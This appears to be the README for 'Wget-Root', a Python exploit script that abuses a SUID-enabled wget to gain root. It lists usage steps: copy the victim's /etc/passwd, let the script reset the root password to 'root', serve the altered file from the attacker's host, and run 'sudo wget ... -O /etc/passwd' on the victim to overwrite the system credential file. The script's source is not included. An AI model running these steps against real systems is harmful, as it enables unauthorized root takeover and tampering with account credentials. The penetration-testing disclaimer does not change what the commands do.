# Wget-Root

This is a python script that exploits wget when being set with a SUID bit, and overwrites the root password. <br>
**⚠️ Warning:** This script is completly for penetration testing purposes. I do not claim any responsibility if you use it for offensive activities.

# Usage
From the victims shell, copy the /etc/passwd file to your host machine. (Be carefull and do not overwrite your own passwd file) <br>
```bash
python3 wget_exploit --file <passwd copy> --port <webserver port> --interface <network interface/ip>
```
The script will overwrite the <passwd copy> file, containing the changed `root` password. 
Then it will host the passwd file to the web using a python http server.<br>
Run the command `sudo wget http://<host ip>:<webserver port>/passwd -O /etc/passwd` on the victims shell to overwrite the passwd file.<br>
**Congratulations!** 
Now switch users to `root` with the password `root`

![showcase](https://i.imgur.com/1bVzFk8.png)
